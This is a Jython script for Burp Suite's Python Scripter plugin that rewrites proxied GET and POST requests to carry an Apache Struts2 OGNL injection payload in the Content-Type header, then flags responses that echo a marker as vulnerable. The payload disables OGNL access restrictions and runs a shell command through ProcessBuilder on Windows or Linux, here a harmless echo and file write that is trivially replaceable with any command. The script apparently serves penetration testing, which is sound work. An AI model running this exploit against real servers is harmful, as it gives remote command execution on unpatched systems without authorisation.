# Requires Python Scripter plugin & Jython Standalone JAR

import sys,re,datetime
now = datetime.datetime.now()

# version 2.2
requestadd = "Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
requestadd += ".(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
requestadd += ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
requestadd += "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
requestadd += "(#context.setMemberAccess(#dm)))).(#cmd='echo 25890deab1075e916c06b9e1efc2e25f && echo 25890deab1075e916c06b9e1efc2e25f > /tmp/test.txt').(#iswin=(@java.lang.System@getProperty('os.name')."
requestadd += "toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
requestadd += "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())."
requestadd += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
requestadd += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n\n"

url = helpers.analyzeRequest(messageInfo).getUrl()



try:
    if messageIsRequest:
        if toolFlag in (callbacks.TOOL_PROXY, callbacks.TOOL_REPEATER):
            request = helpers.bytesToString(messageInfo.getRequest())
            if  "GET" in request and "Content-Type" not in request: 
                request = request[:-2] + requestadd
                print now, 'Testing:', url
                #print "saw get, rewriting"
                print "Request:\n\r", request
                messageInfo.setRequest(helpers.stringToBytes(request))
            elif "POST" in request and "Content-Type" in request:
                #print "saw post, replacing"
                request = re.sub('Content-Type.*?\n',requestadd[:-1],request, flags=re.DOTALL)
                print"-------------------------------------------------------------------------------"
                print "Request:\n\r", request
        else:
            print "Request not in scope"



### RESPONSE PART: simple example  -  response modification (shows hidden fields)
    else:
        response = helpers.bytesToString(messageInfo.getResponse())
        
        if "25890deab1075e916c06b9e1efc2e25f" in response:
            print "##################################"
            print now, "VULNERABLE!!!!",response, url
            print "##################################"
            print response
        else:
            print now, "Not Vulnerable", url
            print "Response:\n\r", response
            print"-------------------------------------------------------------------------------"

except:
    print sys.exc_info()

